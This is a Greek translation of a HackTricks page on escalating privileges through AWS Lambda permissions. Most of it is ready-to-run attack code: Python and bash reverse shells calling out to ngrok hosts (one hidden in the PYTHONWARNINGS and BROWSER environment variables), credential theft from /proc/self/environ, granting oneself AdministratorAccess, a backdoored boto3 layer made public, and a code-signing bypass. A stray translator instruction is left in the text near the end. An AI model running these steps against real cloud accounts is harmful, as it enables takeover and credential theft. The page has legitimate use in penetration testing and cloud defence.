# AWS - Lambda Privesc

{{#include ../../../banners/hacktricks-training.md}}

## lambda

Περισσότερες πληροφορίες για το lambda στο:

{{#ref}}
../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Χρήστες με τα **`iam:PassRole`, `lambda:CreateFunction`, και `lambda:InvokeFunction`** δικαιώματα μπορούν να αναβαθμίσουν τα προνόμιά τους.\
Μπορούν να **δημιουργήσουν μια νέα Lambda function και να της αναθέσουν ένα υπάρχον IAM role**, παραχωρώντας στη function τα δικαιώματα που συνδέονται με εκείνο τον ρόλο. Ο χρήστης μπορεί στη συνέχεια να **γράψει και να ανεβάσει κώδικα σε αυτή τη Lambda function (π.χ. με ένα rev shell)**.\
Μόλις η function ρυθμιστεί, ο χρήστης μπορεί να **ενεργοποιήσει την εκτέλεσή της** και τις επιθυμητές ενέργειες καλώντας τη Lambda function μέσω του AWS API. Αυτή η προσέγγιση επιτρέπει ουσιαστικά στον χρήστη να εκτελεί εργασίες έμμεσα μέσω της Lambda function, λειτουργώντας με το επίπεδο πρόσβασης που έχει παραχωρηθεί στο αντίστοιχο IAM role.\\

Ένας επιτιθέμενος θα μπορούσε να καταχραστεί αυτό για να αποκτήσει ένα **rev shell και να κλέψει το token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Μπορείτε επίσης να **abuse the lambda role permissions** από την ίδια τη lambda function.\
Αν ο lambda role είχε αρκετά permissions, θα μπορούσατε να το χρησιμοποιήσετε για να χορηγήσετε admin rights σε εσάς:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Επίσης είναι δυνατόν να leak τα διαπιστευτήρια ρόλου του lambda χωρίς να απαιτείται εξωτερική σύνδεση. Αυτό είναι χρήσιμο για **Network isolated Lambdas** που χρησιμοποιούνται σε εσωτερικές εργασίες. Αν υπάρχουν άγνωστα security groups που φιλτράρουν τα reverse shells σας, αυτό το κομμάτι κώδικα θα σας επιτρέψει να leak απευθείας τα διαπιστευτήρια ως έξοδο του lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potential Impact:** Άμεσο privesc στο καθορισμένο αυθαίρετο role υπηρεσίας lambda.

> [!CAUTION]
> Σημειώστε ότι ακόμα κι αν φαίνεται ενδιαφέρον η **`lambda:InvokeAsync`** **ΔΕΝ** επιτρέπει από μόνη της να **εκτελέσετε `aws lambda invoke-async`**, χρειάζεστε επίσης `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Όπως στο προηγούμενο σενάριο, μπορείτε να **χορηγήσετε στον εαυτό σας την άδεια `lambda:InvokeFunction`** αν έχετε την άδεια **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Πιθανός Αντίκτυπος:** Άμεση privesc στο αυθαίρετο lambda service role που ορίστηκε.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Χρήστες με **`iam:PassRole`, `lambda:CreateFunction`, και `lambda:CreateEventSourceMapping`** δικαιώματα (και ενδεχομένως `dynamodb:PutItem` και `dynamodb:CreateTable`) μπορούν έμμεσα να **escalate privileges** ακόμα και χωρίς `lambda:InvokeFunction`.\  
Μπορούν να δημιουργήσουν μια **Lambda function με κακόβουλο κώδικα και να της αναθέσουν ένα υπάρχον IAM role**.

Αντί να καλεί απευθείας το Lambda, ο χρήστης ρυθμίζει ή χρησιμοποιεί έναν υπάρχοντα πίνακα DynamoDB, συνδέοντάς τον με το Lambda μέσω ενός event source mapping. Αυτή η ρύθμιση διασφαλίζει ότι η Lambda function **θα ενεργοποιηθεί αυτόματα κατά την καταχώρηση ενός νέου αντικειμένου** στον πίνακα, είτε από ενέργεια του χρήστη είτε από άλλη διαδικασία, καλώντας έτσι έμμεσα τη Lambda function και εκτελώντας τον κώδικα με τα δικαιώματα του περασμένου IAM role.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Εάν το DynamoDB είναι ήδη ενεργό στο περιβάλλον AWS, ο χρήστης απλώς **πρέπει να δημιουργήσει το event source mapping** για τη συνάρτηση Lambda. Ωστόσο, αν το DynamoDB δεν χρησιμοποιείται, ο χρήστης πρέπει **να δημιουργήσει έναν νέο πίνακα** με streaming ενεργοποιημένο:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Τώρα μπορείτε να **συνδέσετε τη λειτουργία Lambda με τον πίνακα DynamoDB** δημιουργώντας **ένα event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Με τη λειτουργία Lambda συνδεδεμένη με το DynamoDB stream, ο επιτιθέμενος μπορεί **να προκαλέσει έμμεσα τη Lambda ενεργοποιώντας το DynamoDB stream**. Αυτό μπορεί να επιτευχθεί με **την εισαγωγή ενός αντικειμένου** στον πίνακα DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Πιθανός αντίκτυπος:** Άμεσο privesc στον καθορισμένο ρόλο υπηρεσίας lambda.

### `lambda:AddPermission`

Ένας attacker με αυτό το permission μπορεί να **grant himself (or others) any permissions** (αυτό δημιουργεί resource based policies για να παραχωρήσει πρόσβαση στον πόρο):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Πιθανός αντίκτυπος:** Άμεσο privesc στον lambda service role μέσω της χορήγησης άδειας για τροποποίηση και εκτέλεση του κώδικα.

### `lambda:AddLayerVersionPermission`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να **χορηγήσει στον εαυτό του (ή σε άλλους) την άδεια `lambda:GetLayerVersion`**. Μπορεί να έχει πρόσβαση στο layer και να αναζητήσει ευπάθειες ή ευαίσθητες πληροφορίες
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potential Impact:** Δυνατότητα πρόσβασης σε ευαίσθητες πληροφορίες.

### `lambda:UpdateFunctionCode`

Οι χρήστες που κατέχουν την άδεια **`lambda:UpdateFunctionCode`** έχουν τη δυνατότητα να **τροποποιήσουν τον κώδικα μιας υπάρχουσας Lambda function που είναι συνδεδεμένη με έναν IAM role.**\
Ο επιτιθέμενος μπορεί να **τροποποιήσει τον κώδικα του lambda ώστε να exfiltrate τα IAM credentials**.

Αν και ο επιτιθέμενος μπορεί να μην έχει την άμεση δυνατότητα να καλέσει τη Lambda function, αν η Lambda function υπάρχει ήδη και είναι σε λειτουργία, είναι πιθανό να ενεργοποιηθεί μέσω υπαρχουσών ροών εργασίας ή γεγονότων, διευκολύνοντας έτσι έμμεσα την εκτέλεση του τροποποιημένου κώδικα.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potential Impact:** Άμεση privesc στον lambda service role που χρησιμοποιείται.

### `lambda:UpdateFunctionConfiguration`

#### RCE μέσω env variables

Με αυτά τα permissions είναι δυνατό να προστεθούν environment variables που θα προκαλέσουν το Lambda να εκτελέσει arbitrary code. Για παράδειγμα, σε python είναι δυνατό να κακοποιήσετε τις environment variables `PYTHONWARNING` και `BROWSER` ώστε μια διεργασία python να εκτελέσει arbitrary commands:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Για άλλες γλώσσες scripting υπάρχουν άλλες env variables που μπορείτε να χρησιμοποιήσετε. Για περισσότερες πληροφορίες ελέγξτε τις υποενότητες των γλωσσών scripting στο:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE μέσω Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) επιτρέπει να συμπεριλάβετε **code** στη συνάρτηση Lambda σας αλλά **αποθηκεύοντάς το ξεχωριστά**, έτσι ο κώδικας της συνάρτησης μπορεί να παραμείνει μικρός και **αρκετές συναρτήσεις μπορούν να μοιραστούν code**.

Μέσα σε Lambda μπορείτε να ελέγξετε τις διαδρομές από τις οποίες φορτώνεται python code με μια συνάρτηση όπως η παρακάτω:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### Εκμετάλλευση

Είναι δυνατό να γίνει κατάχρηση της άδειας `lambda:UpdateFunctionConfiguration` για να **προσθέσετε ένα νέο layer** σε μια lambda function. Για να εκτελεστεί αυθαίρετος κώδικας, αυτό το layer πρέπει να περιέχει κάποια **βιβλιοθήκη την οποία η lambda θα εισάγει.** Αν μπορείτε να διαβάσετε τον κώδικα της lambda, θα το βρείτε εύκολα. Σημειώστε επίσης ότι ίσως η lambda **χρησιμοποιεί ήδη ένα layer** και να μπορείτε να **κατεβάσετε** το layer και να **προσθέσετε εκεί τον κώδικά σας**.

For example, lets suppose that the lambda is using the library boto3, this will create a local layer with the last version of the library:
```bash
pip3 install -t ./lambda_layer boto3
```
Μπορείτε να ανοίξετε το `./lambda_layer/boto3/__init__.py` και **να προσθέσετε το backdoor στον global κώδικα** (π.χ. μια συνάρτηση για exfiltrate credentials ή για να αποκτήσετε ένα reverse shell).

Στη συνέχεια, συμπιέστε τον κατάλογο `./lambda_layer` και **ανεβάστε το νέο lambda layer** στον δικό σας λογαριασμό (ή σε αυτόν του θύματος, αλλά μπορεί να μην έχετε τα απαραίτητα δικαιώματα).\
Σημειώστε ότι πρέπει να δημιουργήσετε έναν φάκελο python και να τοποθετήσετε εκεί τις βιβλιοθήκες για να αντικαταστήσετε το /opt/python/boto3. Επίσης, το layer πρέπει να είναι **συμβατό με την έκδοση python** που χρησιμοποιεί το lambda και, αν το ανεβάσετε στον λογαριασμό σας, πρέπει να βρίσκεται στην **ίδια region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Τώρα, κάντε το ανεβασμένο lambda layer **προσβάσιμο από οποιονδήποτε λογαριασμό**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Και επισυνάψτε το lambda layer στην victim lambda function:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Το επόμενο βήμα θα ήταν είτε να **εκτελέσουμε τη function** εμείς αν μπορούμε είτε να περιμένουμε μέχρι να **εκτελεστεί** με κανονικά μέσα — που είναι η ασφαλέστερη μέθοδος.

Ένας **πιο διακριτικός τρόπος εκμετάλλευσης αυτής της ευπάθειας** μπορεί να βρεθεί στο:

{{#ref}}
../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Πιθανός αντίκτυπος:** Άμεσο privesc στον ρόλο υπηρεσίας της lambda που χρησιμοποιείται.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Ίσως με αυτά τα δικαιώματα να μπορείς να δημιουργήσεις μια function και να την εκτελέσεις καλώντας το URL... αλλά δεν μπόρεσα να βρω τρόπο να το δοκιμάσω, πές μου αν το κάνεις!

### Lambda MitM

Μερικές lambdas θα **λαμβάνουν ευαίσθητες πληροφορίες από τους χρήστες στις παραμέτρους.** Αν πετύχεις RCE σε μία από αυτές, μπορείς να exfiltrate τις πληροφορίες που στέλνουν άλλοι χρήστες σε αυτή — δες το στο:

{{#ref}}
../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## Αναφορές

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Παράκαμψη Lambda Code Signing

Αν μια Lambda function επιβάλλει code signing, ένας επιτιθέμενος που μπορεί είτε να αφαιρέσει το Code Signing Config (CSC) είτε να το υποβαθμίσει σε `WARN` μπορεί να αναπτύξει μη υπογεγραμμένο κώδικα στη function. Αυτό παρακάμπτει τις προστασίες ακεραιότητας χωρίς να τροποποιεί τον IAM ρόλο της function ή τα triggers.

Permissions (ένα από):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Σημειώσεις:
- Για το Path B, δεν χρειάζεσαι προφίλ AWS Signer αν η πολιτική CSC είναι ρυθμισμένη σε `WARN` (επιτρέπονται μη υπογεγραμμένα artifacts).

Βήματα (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Ετοίμασε ένα μικρό payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Διαδρομή A) Αφαίρεση CSC και μετά ενημέρωση του code:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Διαδρομή B) Υποβάθμιση σε Warn και ενημέρωση του κώδικα (αν η διαγραφή δεν επιτρέπεται):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Verified. Θα μεταφράζω το σχετικό αγγλικό κείμενο στα Ελληνικά διατηρώντας άθικτο κώδικα, ονόματα υπηρεσιών (π.χ. aws, GCP), τεχνικούς όρους hacking, links, paths, tags και refs, χωρίς να προσθέσω επιπλέον περιεχόμενο.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Πιθανός αντίκτυπος: Δυνατότητα να ανεβάσετε και να εκτελέσετε αυθαίρετο μη υπογεγραμμένο κώδικα σε μια συνάρτηση που υποτίθεται ότι επιβάλλει signed deployments, ενδεχομένως οδηγώντας σε εκτέλεση κώδικα με τα δικαιώματα του ρόλου της συνάρτησης.

Καθαρισμός:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

